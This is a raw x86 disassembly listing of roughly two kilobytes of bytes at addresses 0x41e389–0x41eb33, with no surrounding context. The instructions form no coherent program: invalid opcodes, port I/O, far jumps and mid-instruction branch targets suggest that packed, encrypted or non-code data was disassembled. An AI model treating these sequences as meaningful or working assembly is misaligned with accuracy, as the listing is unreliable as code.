  41e389:	fsub   QWORD PTR [edi+0x47de831b]
  41e38f:	mov    esi,0xf9d89023
  41e394:	jmp    0x41e373
  41e396:	daa    
  41e397:	inc    ebp
  41e398:	loope  0x41e3cb
  41e39a:	and    eax,0xd948f5e0
  41e39f:	mov    DWORD PTR [ecx+0x52],esp
  41e3a2:	gs (bad) 
  41e3a4:	in     al,0x16
  41e3a6:	in     al,dx
  41e3a7:	mov    edx,0x87ad4923
  41e3ac:	or     BYTE PTR [ebp*4-0x3ee4101a],0x67
  41e3b4:	in     eax,0x6
  41e3b6:	jmp    0x41e37c
  41e3b8:	jbe    0x41e396
  41e3ba:	inc    ebp
  41e3bb:	cmp    al,0x6c
  41e3bd:	mov    eax,ds:0x372092e7
  41e3c2:	pushf  
  41e3c3:	cld    
  41e3c4:	dec    edx
  41e3c5:	push   esi
  41e3c6:	test   dh,dh
  41e3c8:	fcmove st,st(7)
  41e3ca:	inc    eax
  41e3cb:	outs   dx,DWORD PTR ds:[esi]
  41e3cc:	imul   ebp,DWORD PTR ds:0x8bc12015,0xd7c4750f
  41e3d6:	adc    eax,0x181a9c50
  41e3db:	repz jmp 0xbecdcb0
  41e3e1:	pop    ecx
  41e3e2:	jg     0x41e3bf
  41e3e4:	mov    ebp,0xea236934
  41e3e9:	mov    edi,0x31a008a7
  41e3ee:	daa    
  41e3ef:	push   es
  41e3f0:	aam    0x34
  41e3f2:	fsubr  st(3),st
  41e3f4:	mov    eax,ds:0xcc655087
  41e3f9:	(bad)  
  41e3fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3fc:	rcl    BYTE PTR [ecx],1
  41e3fe:	or     eax,0x4884c328
  41e403:	xchg   edx,esi
  41e405:	stc    
  41e406:	inc    edi
  41e407:	in     al,0x97
  41e409:	push   es
  41e40a:	(bad)  
  41e40b:	std    
  41e40c:	sbb    DWORD PTR [esi+0x37],ecx
  41e40f:	mov    ds:0xb47e22c7,al
  41e414:	mov    edx,0xcdb20fc5
  41e419:	ret    0x37d5
  41e41c:	add    cl,al
  41e41e:	push   esi
  41e41f:	lds    esi,FWORD PTR [ebp+0x473e4e6c]
  41e425:	pop    ecx
  41e426:	ds cmc 
  41e428:	dec    eax
  41e429:	mov    dl,0xd4
  41e42b:	mov    al,0x5e
  41e42d:	in     al,dx
  41e42e:	pusha  
  41e42f:	inc    esp
  41e430:	xchg   edx,eax
  41e431:	fnstcw WORD PTR [esi+0x2c9f9b14]
  41e437:	(bad)  
  41e438:	adc    edi,DWORD PTR [ecx]
  41e43a:	push   0x1e2339cd
  41e43f:	pop    ebx
  41e440:	cs in  al,dx
  41e442:	xchg   ebx,eax
  41e443:	adc    DWORD PTR [esi],0x1e
  41e446:	rcr    al,cl
  41e448:	loope  0x41e3d5
  41e44a:	push   ebx
  41e44b:	(bad)  
  41e44c:	fs out dx,eax
  41e44e:	idiv   DWORD PTR [ecx-0x26]
  41e451:	pop    ds
  41e452:	sbb    eax,0x48360e56
  41e457:	jnp    0x41e443
  41e459:	test   eax,0xdb9a6d53
  41e45e:	sub    eax,0x4770af1f
  41e463:	jns    0x41e4c1
  41e465:	xor    DWORD PTR [ebx],eax
  41e467:	mov    eax,DWORD PTR [esi+0x19]
  41e46a:	or     BYTE PTR [eax-0x36940d92],cl
  41e470:	add    al,0xce
  41e472:	scas   eax,DWORD PTR es:[edi]
  41e473:	xor    al,0x76
  41e475:	(bad)  
  41e477:	pop    ebx
  41e478:	or     bh,BYTE PTR [ebx]
  41e47a:	adc    bh,BYTE PTR [esi+0x31]
  41e47d:	mov    edi,0xd7928a35
  41e482:	push   edx
  41e483:	loope  0x41e497
  41e485:	pop    eax
  41e486:	shl    DWORD PTR [ecx+0x6f4ee70],cl
  41e48c:	jmp    0x3426:0xc2ab3115
  41e493:	inc    ecx
  41e494:	loop   0x41e44f
  41e496:	imul   ecx,DWORD PTR [ebp-0x7f],0x24
  41e49a:	nop
  41e49b:	push   es
  41e49c:	or     bl,ah
  41e49e:	add    al,0x78
  41e4a0:	inc    ecx
  41e4a2:	inc    esi
  41e4a3:	push   edx
  41e4a4:	clc    
  41e4a5:	gs test al,0xf6
  41e4a8:	pop    ecx
  41e4a9:	ret    0xbb86
  41e4ac:	inc    edx
  41e4ad:	mov    al,0x54
  41e4af:	enter  0x24bb,0xd
  41e4b3:	jne    0x41e483
  41e4b5:	imul   edi,DWORD PTR [esp+edx*8],0x57
  41e4b9:	mov    ebx,0x3964a38d
  41e4be:	dec    esi
  41e4bf:	xor    DWORD PTR [edi+0x791213d0],esp
  41e4c5:	fisub  DWORD PTR [esi]
  41e4c7:	xor    BYTE PTR [edi-0x77],ah
  41e4ca:	dec    edx
  41e4cb:	mul    DWORD PTR [ebx-0x7be5fee]
  41e4d1:	(bad)  
  41e4d2:	xchg   ebp,eax
  41e4d3:	xor    BYTE PTR [edi+eax*1],bl
  41e4d6:	add    eax,0x819b298b
  41e4db:	xor    bh,BYTE PTR [eax-0x94436c1]
  41e4e1:	rcl    BYTE PTR [ebx],cl
  41e4e3:	sbb    ebx,DWORD PTR [esi+0xd]
  41e4e6:	mov    esi,edx
  41e4e8:	add    BYTE PTR [ebx-0x25f4dd8a],0x67
  41e4ef:	jns    0x41e490
  41e4f1:	add    eax,0xeed5b027
  41e4f6:	sub    DWORD PTR [esp+esi*2],eax
  41e4f9:	popf   
  41e4fa:	push   0x61
  41e4fc:	dec    BYTE PTR [ebx+ecx*1]
  41e4ff:	in     al,0x14
  41e501:	cs cld 
  41e503:	mov    eax,0xd44efb2d
  41e508:	fstp   QWORD PTR [edx]
  41e50a:	cmp    esi,DWORD PTR [ecx-0x7544ec]
  41e510:	adc    edi,DWORD PTR [edx+edi*8]
  41e513:	inc    edi
  41e514:	mov    esi,0xc9b2cd3c
  41e519:	jnp    0x41e4d7
  41e51b:	fldcw  WORD PTR [edi-0x48]
  41e51e:	mov    ebx,0x95d2aa49
  41e523:	sahf   
  41e524:	cmp    BYTE PTR [edi+0x559f5db0],ah
  41e52a:	pop    ds
  41e52b:	adc    al,0xb0
  41e52d:	xor    al,0x93
  41e52f:	xchg   DWORD PTR [eax-0x7a],eax
  41e532:	lock dec ebx
  41e534:	sub    DWORD PTR [edi-0x7c],edx
  41e537:	rcl    DWORD PTR [edx],0xd0
  41e53a:	mov    ah,bl
  41e53c:	xor    eax,0x58157130
  41e541:	outs   dx,BYTE PTR ds:[esi]
  41e542:	xor    ebx,DWORD PTR [ebx+0x14]
  41e545:	jb     0x41e4d7
  41e547:	test   DWORD PTR [edx],edx
  41e549:	cwde   
  41e54a:	cs jmp 0x999b:0xd58a71b6
  41e552:	mov    es,WORD PTR [ebx]
  41e554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e555:	rol    BYTE PTR [eax+0x69],1
  41e558:	(bad)  
  41e559:	and    eax,0x908f62f0
  41e55e:	pop    es
  41e55f:	inc    ebx
  41e560:	loope  0x41e5c8
  41e562:	stos   DWORD PTR es:[edi],eax
  41e563:	int3   
  41e564:	or     esp,DWORD PTR [esi-0x6ea07f44]
  41e56a:	gs fwait
  41e56c:	cdq    
  41e56d:	and    eax,0x6d24ef06
  41e572:	mov    dh,0x88
  41e574:	dec    ebx
  41e575:	cmc    
  41e576:	jb     0x41e583
  41e578:	lahf   
  41e579:	clc    
  41e57a:	xchg   esi,eax
  41e57b:	bound  ebp,QWORD PTR [edx]
  41e57d:	daa    
  41e57e:	mov    ebp,0x29976187
  41e583:	test   eax,0x7f881f43
  41e588:	adc    edx,DWORD PTR [ebp+0x769a2f5e]
  41e58e:	fadd   QWORD PTR [ebx]
  41e590:	and    esp,ebp
  41e592:	or     BYTE PTR [ecx],cl
  41e594:	rcl    BYTE PTR [ebx-0x3],1
  41e597:	test   BYTE PTR [ecx-0xc255e06],0x34
  41e59e:	xor    DWORD PTR [edx-0x67659a80],0x71606837
  41e5a8:	or     bl,dl
  41e5aa:	and    esp,DWORD PTR [esi]
  41e5ac:	call   0xd30b:0xcbe22522
  41e5b3:	sahf   
  41e5b4:	adc    eax,0x8b3113f1
  41e5b9:	retf   
  41e5ba:	ja     0x41e624
  41e5bc:	cmp    eax,0x1f93269e
  41e5c1:	int3   
  41e5c2:	add    edx,DWORD PTR [esi]
  41e5c4:	pop    edi
  41e5c5:	pmovmskb edx,mm1
  41e5c8:	(bad)  
  41e5c9:	(bad)  
  41e5ca:	sbb    eax,0x37593206
  41e5cf:	sti    
  41e5d0:	add    al,0xd0
  41e5d2:	pusha  
  41e5d3:	jmp    0x41e620
  41e5d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5d6:	push   ebx
  41e5d7:	inc    esi
  41e5d8:	(bad)  
  41e5d9:	mov    esp,0xa47d2258
  41e5de:	and    BYTE PTR [esi],dh
  41e5e0:	imul   edi,DWORD PTR [eax-0x526a64a1],0x798f4a27
  41e5ea:	and    DWORD PTR [eax+0x5d178e44],0xa065c137
  41e5f4:	cmp    BYTE PTR [edi],ch
  41e5f6:	pushf  
  41e5f7:	pop    ebx
  41e5f8:	pop    es
  41e5f9:	imul   edx,DWORD PTR [edx+0x4b],0x354a64c3
  41e600:	ficom  DWORD PTR [edx+0x68]
  41e603:	in     al,dx
  41e604:	(bad)  
  41e605:	mov    esi,0x6f208a8a
  41e60a:	sbb    eax,0xe7e80443
  41e60f:	and    al,0xde
  41e611:	pop    edi
  41e612:	inc    edi
  41e613:	pop    ds
  41e614:	cmp    ah,BYTE PTR [edx]
  41e616:	xor    al,0x8e
  41e618:	cli    
  41e619:	cmc    
  41e61a:	lock mov eax,ds:0xa137ea24
  41e620:	pop    ss
  41e621:	inc    esp
  41e622:	xchg   BYTE PTR [edx-0x52a9ae2e],cl
  41e628:	xor    BYTE PTR [eax+eiz*2],ch
  41e62b:	and    eax,0xcc83d62d
  41e630:	mov    al,ds:0x32aef106
  41e635:	or     al,0x4d
  41e637:	push   cs
  41e638:	adc    al,0x76
  41e63a:	mov    ds:0xa60298c3,al
  41e63f:	out    0x86,eax
  41e641:	inc    edx
  41e642:	sub    eax,0x36730f07
  41e647:	xor    ch,BYTE PTR [ebx+0x55]
  41e64a:	scas   al,BYTE PTR es:[edi]
  41e64b:	add    ebp,0x1b
  41e64e:	mov    al,0x1f
  41e650:	es or  al,0x21
  41e653:	icebp  
  41e654:	xchg   esi,eax
  41e655:	mov    ah,0xba
  41e657:	xchg   edx,eax
  41e658:	or     eax,0xb1c765f6
  41e65d:	mov    esp,0x12932ca5
  41e662:	xchg   ecx,eax
  41e663:	inc    esi
  41e664:	jo     0x41e67a
  41e666:	cwde   
  41e667:	pushf  
  41e668:	daa    
  41e669:	xchg   esi,eax
  41e66a:	xor    al,0x81
  41e66c:	push   esi
  41e66d:	cs jnp 0x41e6de
  41e670:	inc    ebx
  41e671:	jge    0x41e60e
  41e673:	sahf   
  41e674:	mov    esp,0x629abc2e
  41e679:	fs jne 0x41e671
  41e67c:	inc    ecx
  41e67d:	sti    
  41e67e:	mov    ah,0x73
  41e680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e681:	adc    al,0x99
  41e683:	(bad)  
  41e684:	sbb    DWORD PTR [ebp-0x8],eax
  41e687:	inc    ecx
  41e688:	push   0x8f5784e
  41e68d:	xchg   esi,eax
  41e68e:	loopne 0x41e6df
  41e690:	pop    eax
  41e691:	pop    ebx
  41e692:	popf   
  41e693:	cmp    DWORD PTR [ebx+0x69556b3e],0x8f0f2606
  41e69d:	imul   edi,DWORD PTR [esi+esi*1+0x7c1986ba],0xffffff93
  41e6a5:	jb     0x41e6e9
  41e6a7:	fild   WORD PTR [ebx+ecx*8]
  41e6aa:	dec    esi
  41e6ab:	jnp    0x41e6f6
  41e6ad:	jmp    0x1b8979cd
  41e6b2:	xor    dh,dh
  41e6b4:	es or  eax,0x66f3b355
  41e6ba:	jnp    0x41e700
  41e6bc:	icebp  
  41e6bd:	cwde   
  41e6be:	test   eax,0xd7b01c8d
  41e6c3:	inc    ebx
  41e6c4:	mov    esp,0xa5eeaf2f
  41e6c9:	test   eax,0xe3051691
  41e6ce:	popf   
  41e6cf:	adc    ah,bh
  41e6d1:	mov    dl,0xf3
  41e6d3:	imul   ebp,DWORD PTR [eax-0x66],0xcb3d6e95
  41e6da:	inc    esp
  41e6db:	xchg   edx,eax
  41e6dc:	mul    DWORD PTR [ecx]
  41e6de:	xor    DWORD PTR [eax-0x59e637b6],eax
  41e6e4:	mov    ds:0xea56c8a8,eax
  41e6e9:	push   ds
  41e6ea:	jbe    0x41e704
  41e6ec:	(bad)  
  41e6ee:	nop
  41e6ef:	adc    al,0xb2
  41e6f1:	in     al,0xf7
  41e6f3:	or     BYTE PTR [ebp+0x46],al
  41e6f6:	ret    
  41e6f7:	cwde   
  41e6f8:	ret    
  41e6f9:	xchg   edi,eax
  41e6fa:	xor    bh,BYTE PTR [ebx]
  41e6fc:	aam    0x57
  41e6fe:	cmp    al,0x27
  41e700:	push   ebp
  41e701:	test   eax,0xb0b9a9c5
  41e706:	call   0x97c6:0x868fff98
  41e70d:	jae    0x41e71f
  41e70f:	xchg   DWORD PTR [esi+0x73192594],eax
  41e715:	scas   al,BYTE PTR es:[edi]
  41e716:	je     0x41e75c
  41e718:	test   eax,0x7c7540a4
  41e71d:	inc    ebp
  41e71e:	aas    
  41e71f:	data16 hlt 
  41e721:	leave  
  41e722:	inc    DWORD PTR [eax]
  41e724:	repz jecxz 0x41e6e3
  41e727:	jg     0x41e760
  41e729:	sti    
  41e72a:	pop    ss
  41e72b:	cmp    edi,esp
  41e72d:	call   0x45493170
  41e732:	mov    eax,ds:0x35e15bb8
  41e737:	(bad)  
  41e738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e739:	aaa    
  41e73a:	pop    ds
  41e73b:	rcl    esp,cl
  41e73d:	mov    ah,0xae
  41e73f:	rcr    BYTE PTR [eax-0x53b9371],1
  41e745:	clc    
  41e746:	add    al,BYTE PTR [ebp-0x50]
  41e749:	add    DWORD PTR [edi*1+0x22318b96],ecx
  41e750:	pushf  
  41e751:	aaa    
  41e752:	adc    esi,DWORD PTR [ebx-0x27]
  41e755:	cmp    bl,al
  41e757:	mov    DWORD PTR [esi],eax
  41e759:	mov    esi,0x61eb9ffc
  41e75e:	adc    edx,DWORD PTR [esi-0x6067a1bc]
  41e764:	jmp    0xc9687f62
  41e769:	add    BYTE PTR [ebx-0x209ecc25],0xfc
  41e770:	mov    bh,0xb6
  41e772:	mov    bl,0x1a
  41e774:	loop   0x41e7d4
  41e776:	icebp  
  41e777:	ds ds int3 
  41e77a:	into   
  41e77b:	rcl    BYTE PTR [esi+0x517ef7c8],cl
  41e781:	imul   ecx,edx,0x31
  41e784:	aam    0x4d
  41e786:	inc    esi
  41e787:	cdq    
  41e788:	jecxz  0x41e71a
  41e78a:	repz xor dh,0xaf
  41e78e:	int    0xed
  41e790:	jecxz  0x41e7f0
  41e792:	mov    ds:0x75fc5857,eax
  41e797:	neg    DWORD PTR [ebp-0x2ca5e1cd]
  41e79d:	loop   0x41e79b
  41e79f:	das    
  41e7a0:	pusha  
  41e7a1:	lods   al,BYTE PTR ds:[esi]
  41e7a2:	fwait
  41e7a3:	into   
  41e7a4:	call   0x822892a8
  41e7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7aa:	mov    ds:0xfa45a8f4,al
  41e7af:	lock div DWORD PTR [ebp-0xe]
  41e7b3:	icebp  
  41e7b4:	xchg   DWORD PTR [edx],edx
  41e7b6:	(bad)  
  41e7b7:	faddp  st(2),st
  41e7b9:	icebp  
  41e7ba:	xchg   edi,eax
  41e7bb:	mov    eax,ebx
  41e7bd:	push   esp
  41e7be:	outs   dx,BYTE PTR ds:[esi]
  41e7bf:	jmp    0x7cc8:0xef94059
  41e7c6:	push   ecx
  41e7c7:	shl    DWORD PTR ds:0x60f993b2,cl
  41e7cd:	aaa    
  41e7ce:	js     0x41e81b
  41e7d0:	jmp    0x41e801
  41e7d2:	sub    eax,0xddba7e80
  41e7d7:	daa    
  41e7d8:	mov    DWORD PTR [eax+0x24],ebp
  41e7db:	jecxz  0x41e82a
  41e7dd:	das    
  41e7de:	mov    DWORD PTR [ebx+0x5b],eax
  41e7e1:	sbb    BYTE PTR [edx+0x64],0xc3
  41e7e5:	mov    ds:0xf7129a61,al
  41e7ea:	dec    esi
  41e7eb:	sbb    BYTE PTR [ebx-0x76ebd668],al
  41e7f1:	pop    esi
  41e7f2:	(bad)  
  41e7f3:	sub    DWORD PTR [ebx+0x6a],ebp
  41e7f6:	outs   dx,DWORD PTR ds:[esi]
  41e7f7:	mov    eax,0x2313a5a5
  41e7fc:	jb     0x41e7fd
  41e7fe:	xchg   DWORD PTR [ecx],esi
  41e800:	adc    bh,dl
  41e802:	or     eax,0xa46a39a3
  41e807:	clc    
  41e808:	(bad)  
  41e80a:	mov    cs,WORD PTR [edx+0x1ab27205]
  41e810:	vfmaddsub132pd xmm4,xmm0,XMMWORD PTR [eax]
  41e815:	mov    edi,0x36acc23c
  41e81a:	push   ds
  41e81b:	fsubr  DWORD PTR [edx+ecx*8-0x61]
  41e81f:	retf   
  41e820:	mov    al,0xc0
  41e822:	dec    eax
  41e823:	mov    dl,0xdf
  41e825:	nop
  41e826:	addr16 xor eax,0x8ad295f
  41e82c:	ffree  st(2)
  41e82e:	sub    ah,cl
  41e830:	int    0x79
  41e832:	repnz ds inc edx
  41e835:	pop    edi
  41e836:	cmp    BYTE PTR ds:0xc66bdf08,0x1f
  41e83d:	fistp  DWORD PTR [eax]
  41e83f:	cwde   
  41e840:	and    eax,0x4b3d1d86
  41e845:	mov    eax,0xffaa5ba7
  41e84a:	push   ebp
  41e84b:	xchg   edx,eax
  41e84c:	adc    ebx,DWORD PTR [eax]
  41e84e:	adc    eax,0xc1123bcc
  41e853:	xchg   edx,eax
  41e854:	cwde   
  41e855:	xchg   esi,eax
  41e856:	dec    esi
  41e857:	or     DWORD PTR [eax],edx
  41e859:	popa   
  41e85a:	pusha  
  41e85b:	jecxz  0x41e816
  41e85d:	les    ebp,FWORD PTR [ebp+0x451db1]
  41e863:	jo     0x41e895
  41e865:	call   0x3687:0xe44d418e
  41e86c:	imul   esp,DWORD PTR [ebp-0x28],0xe753c917
  41e873:	cld    
  41e874:	das    
  41e875:	jb     0x41e835
  41e877:	jmp    0xccee5247
  41e87c:	mov    eax,ds:0x7ef31195
  41e881:	sub    DWORD PTR ds:0x53555571,ebx
  41e887:	cld    
  41e888:	or     eax,0xb5fcacbb
  41e88d:	fmul   st(3),st
  41e88f:	or     eax,0xb1c2103b
  41e894:	retf   
  41e895:	add    DWORD PTR [ecx],eax
  41e897:	je     0x41e8a6
  41e899:	sub    DWORD PTR [ecx-0x1812a3cd],esi
  41e89f:	arpl   si,bp
  41e8a1:	fnstsw WORD PTR [edi]
  41e8a3:	sub    BYTE PTR [edi+0x6ea18c6a],0x3e
  41e8aa:	jmp    0x41e877
  41e8ac:	mov    ecx,0x1053b68d
  41e8b1:	cmp    cl,BYTE PTR ds:0xad011f62
  41e8b7:	xlat   BYTE PTR ds:[ebx]
  41e8b8:	dec    esp
  41e8b9:	jp     0x41e84e
  41e8bb:	mov    edx,0xf76c1c85
  41e8c0:	sti    
  41e8c1:	sbb    DWORD PTR ds:0xc340f611,eax
  41e8c7:	push   esi
  41e8c9:	aad    0x47
  41e8cb:	push   ebx
  41e8cc:	lahf   
  41e8cd:	in     eax,dx
  41e8ce:	fwait
  41e8cf:	add    BYTE PTR [esp+eiz*2+0x4f],bl
  41e8d3:	ret    
  41e8d4:	repnz test DWORD PTR [edi],ecx
  41e8d7:	hlt    
  41e8d8:	dec    DWORD PTR [eax-0x48]
  41e8db:	push   0x9fa82265
  41e8e0:	arpl   WORD PTR [ebp+0x2],bx
  41e8e3:	ds je  0x41e90b
  41e8e6:	lea    ebp,[esi+0x1c1a3851]
  41e8ec:	mov    ds:0x6de5695c,eax
  41e8f1:	(bad)  
  41e8f2:	ins    BYTE PTR es:[edi],dx
  41e8f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8f4:	xlat   BYTE PTR ds:[ebx]
  41e8f5:	out    dx,eax
  41e8f6:	jp     0x41e89a
  41e8f8:	sub    ebp,DWORD PTR [ecx]
  41e8fa:	rol    BYTE PTR [esi],cl
  41e8fc:	popf   
  41e8fd:	lods   eax,DWORD PTR ds:[esi]
  41e8fe:	adc    eax,0xc6dccfbe
  41e903:	push   ss
  41e904:	(bad)  
  41e905:	hlt    
  41e906:	adc    eax,0xcebcbaf9
  41e90b:	push   es
  41e90c:	pop    edx
  41e90d:	pop    edi
  41e90e:	dec    esp
  41e90f:	pop    ebp
  41e910:	ins    DWORD PTR es:[edi],dx
  41e911:	dec    edx
  41e912:	fdiv   DWORD PTR [ebx]
  41e914:	stos   DWORD PTR es:[edi],eax
  41e915:	pop    edx
  41e916:	nop
  41e917:	leave  
  41e918:	xchg   DWORD PTR [ebx+0x41],eax
  41e91b:	rcl    DWORD PTR [ecx+0x9],cl
  41e91e:	sar    BYTE PTR [eax+ebx*4],0xae
  41e922:	sbb    dh,BYTE PTR [eax+0x55]
  41e925:	stos   DWORD PTR es:[edi],eax
  41e926:	sub    DWORD PTR [edi+esi*2+0x19190de4],esi
  41e92d:	enter  0x7473,0xe7
  41e931:	pop    ss
  41e932:	xchg   edi,eax
  41e933:	dec    ecx
  41e934:	cdq    
  41e935:	icebp  
  41e936:	ja     0x41e92f
  41e938:	rcl    BYTE PTR [ebx],1
  41e93a:	sub    dh,BYTE PTR [esp]
  41e93d:	or     ecx,ebx
  41e93f:	test   BYTE PTR [edi],bl
  41e941:	mov    cl,0xfd
  41e943:	or     eax,0xd78cef39
  41e948:	ja     0x41e930
  41e94a:	push   esi
  41e94b:	cmp    BYTE PTR [ebp-0x1cd19776],bl
  41e951:	mov    WORD PTR [esi],cs
  41e953:	call   0xff6:0xd03471d4
  41e95a:	sub    BYTE PTR [eax+0x1efdcba7],bl
  41e960:	mul    dh
  41e962:	inc    eax
  41e963:	mov    al,ds:0x5d2eb02a
  41e968:	dec    edi
  41e969:	xchg   ebx,eax
  41e96a:	hlt    
  41e96b:	leave  
  41e96c:	cdq    
  41e96d:	(bad)  
  41e96e:	jl     0x41e976
  41e970:	cli    
  41e971:	lods   al,BYTE PTR gs:[esi]
  41e973:	mov    BYTE PTR [esi],bl
  41e975:	ror    DWORD PTR [esp+esi*4+0x3390eb5c],1
  41e97c:	xchg   ebp,eax
  41e97d:	jbe    0x41e993
  41e97f:	or     ebp,DWORD PTR [edi]
  41e981:	nop
  41e982:	test   eax,0x4ccf79df
  41e987:	xor    al,0x83
  41e989:	popa   
  41e98a:	xor    eax,0x58f31acc
  41e98f:	int3   
  41e990:	xchg   edx,eax
  41e991:	jae    0x41e9f9
  41e993:	aad    0x29
  41e995:	subps  xmm2,XMMWORD PTR [ebp+0x76380c1e]
  41e99c:	add    edi,DWORD PTR [ebx+0x618ecbb5]
  41e9a2:	xchg   esi,eax
  41e9a3:	out    dx,al
  41e9a4:	pop    eax
  41e9a5:	shl    dh,cl
  41e9a7:	jmp    0x7ef:0x8388bc6c
  41e9ae:	out    dx,al
  41e9af:	or     edi,esi
  41e9b1:	mov    dh,0xe7
  41e9b3:	scas   al,BYTE PTR es:[edi]
  41e9b4:	or     al,BYTE PTR [ebx]
  41e9b6:	dec    ecx
  41e9b7:	mov    ch,0x7a
  41e9b9:	adc    eax,0xd6552496
  41e9be:	std    
  41e9bf:	and    eax,0x5f4a3291
  41e9c4:	mov    al,ds:0xbf47bd62
  41e9c9:	adc    BYTE PTR [esi+0x4ffab86f],bl
  41e9cf:	cmp    esp,edx
  41e9d1:	cwde   
  41e9d2:	fsubr  DWORD PTR [edi-0x66]
  41e9d5:	xor    al,0x69
  41e9d7:	add    eax,DWORD PTR [edx+0x22]
  41e9da:	(bad)  
  41e9db:	xor    dl,BYTE PTR gs:[ebx+0x240573af]
  41e9e2:	push   esi
  41e9e3:	shl    DWORD PTR [edi],0x7
  41e9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e7:	hlt    
  41e9e8:	push   eax
  41e9e9:	mov    eax,ds:0xbbb9377a
  41e9ee:	jae    0x41ea06
  41e9f0:	in     eax,dx
  41e9f1:	not    DWORD PTR [eax]
  41e9f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9f4:	xchg   BYTE PTR [edi-0x78c276bc],dh
  41e9fa:	clc    
  41e9fb:	adc    eax,edi
  41e9fd:	stc    
  41e9fe:	(bad)  
  41e9ff:	push   0xfffffffd
  41ea01:	js     0x41ea0c
  41ea03:	xlat   BYTE PTR ds:[ebx]
  41ea04:	cs sahf 
  41ea06:	es mov bl,0x0
  41ea09:	mov    bl,0xbb
  41ea0b:	xor    edi,DWORD PTR [esi]
  41ea0d:	mov    BYTE PTR [edx],dl
  41ea0f:	mov    ebx,0xbedf839c
  41ea14:	mov    ecx,0xbf00c30c
  41ea19:	dec    BYTE PTR ds:[esi+0x1]
  41ea1d:	call   FWORD PTR [edx+0x2c]
  41ea20:	add    edx,DWORD PTR ss:[edi]
  41ea23:	rol    bl,0x85
  41ea26:	sbb    ebp,DWORD PTR [eax-0x66231209]
  41ea2c:	ins    DWORD PTR es:[edi],dx
  41ea2d:	loop   0x41ea46
  41ea2f:	jno    0x41ea93
  41ea31:	call   0x38ff:0x6001be0e
  41ea38:	iret   
  41ea39:	dec    edi
  41ea3a:	outs   dx,BYTE PTR ds:[esi]
  41ea3b:	fisttp QWORD PTR [eax-0x4b86586b]
  41ea41:	push   esi
  41ea42:	fwait
  41ea43:	ret    
  41ea44:	loop   0x41e9d4
  41ea46:	xor    eax,0x2938301e
  41ea4b:	jl     0x41eac4
  41ea4d:	xchg   ebx,eax
  41ea4e:	fwait
  41ea4f:	arpl   WORD PTR [ebx],sp
  41ea51:	sti    
  41ea52:	loop   0x41e9dd
  41ea54:	xchg   ebp,eax
  41ea55:	ret    
  41ea56:	jne    0x41eaa2
  41ea58:	sahf   
  41ea59:	add    cl,BYTE PTR [eax+0x75]
  41ea5c:	dec    edi
  41ea5d:	mov    al,0xd9
  41ea5f:	mov    eax,ds:0x63312ffd
  41ea64:	sti    
  41ea65:	(bad)  
  41ea66:	shr    BYTE PTR [edx+ecx*1+0x21bc66f4],1
  41ea6d:	inc    esp
  41ea6e:	or     al,0x6
  41ea70:	pop    edx
  41ea71:	pop    esp
  41ea72:	mov    eax,ds:0x9dd04505
  41ea77:	xchg   ebp,eax
  41ea78:	div    BYTE PTR [ebp+0x34a77db7]
  41ea7e:	lea    esp,[ecx]
  41ea80:	and    ebp,0xffffffbc
  41ea83:	int3   
  41ea84:	ds js  0x41ea92
  41ea87:	push   0xecf7dbb
  41ea8c:	in     al,dx
  41ea8d:	xor    BYTE PTR [ecx-0x63],bh
  41ea90:	or     al,bl
  41ea92:	stos   DWORD PTR es:[edi],eax
  41ea93:	xor    eax,0xfc72456c
  41ea98:	enter  0xb71c,0x3c
  41ea9c:	adc    DWORD PTR [esi],eax
  41ea9e:	(bad)  
  41eaa0:	push   ecx
  41eaa1:	test   eax,0xe5488475
  41eaa6:	dec    eax
  41eaa7:	push   cs
  41eaa8:	sbb    esp,DWORD PTR [ecx]
  41eaaa:	inc    edi
  41eaab:	push   esi
  41eaac:	ja     0x41eaf1
  41eaae:	xlat   BYTE PTR ds:[ebx]
  41eaaf:	stos   DWORD PTR es:[edi],eax
  41eab0:	xor    bh,BYTE PTR [esi]
  41eab2:	popa   
  41eab3:	cld    
  41eab4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab5:	sub    al,0xc0
  41eab7:	lea    ebx,[ebx-0x47c61468]
  41eabd:	ins    DWORD PTR es:[edi],dx
  41eabe:	clc    
  41eabf:	adc    al,0xd1
  41eac1:	pop    ss
  41eac2:	push   ecx
  41eac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eac4:	sbb    BYTE PTR [esp+eiz*2+0x5620a2da],0x8b
  41eacc:	mov    bh,0x9e
  41eace:	loope  0x41ea80
  41ead0:	mov    ds:0x417b39b4,al
  41ead5:	jecxz  0x41eb17
  41ead7:	mov    ds:0x2633d97a,eax
  41eadc:	xchg   esp,eax
  41eadd:	push   ds
  41eade:	cmp    eax,0x7b345890
  41eae3:	sub    BYTE PTR [esp+edi*2+0x5d143e2c],0x99
  41eaeb:	add    ebp,0x55b2f94a
  41eaf1:	mov    ch,0xfe
  41eaf3:	pop    ds
  41eaf4:	rcl    ecx,1
  41eaf6:	or     esi,ebp
  41eaf8:	imul   ebp
  41eafa:	xchg   DWORD PTR [esi-0x11c5ae8e],ebx
  41eb00:	or     ch,bh
  41eb02:	mov    dl,0x1f
  41eb04:	inc    edx
  41eb05:	outs   dx,DWORD PTR ds:[esi]
  41eb06:	ds mov ecx,0x6c5557f5
  41eb0c:	and    eax,0xe26f8025
  41eb11:	mov    esi,cs
  41eb13:	fidiv  DWORD PTR [ecx+0x6d]
  41eb16:	xchg   ecx,eax
  41eb17:	or     BYTE PTR [ebx+0x486ccadc],cl
  41eb1d:	dec    edi
  41eb1e:	add    BYTE PTR [edx],al
  41eb20:	lock add bh,dl
  41eb23:	xchg   ebp,eax
  41eb24:	xlat   BYTE PTR ds:[ebx]
  41eb25:	pop    ebx
  41eb26:	aas    
  41eb27:	stc    
  41eb28:	push   ds
  41eb29:	dec    ecx
  41eb2a:	jo     0x41eafb
  41eb2c:	test   al,0xf5
  41eb2e:	lock xchg ecx,eax
  41eb30:	push   es
  41eb31:	mov    bh,0x1d
  41eb33:	and    BYTE PTR [eiz*1-0x77b762be],bl
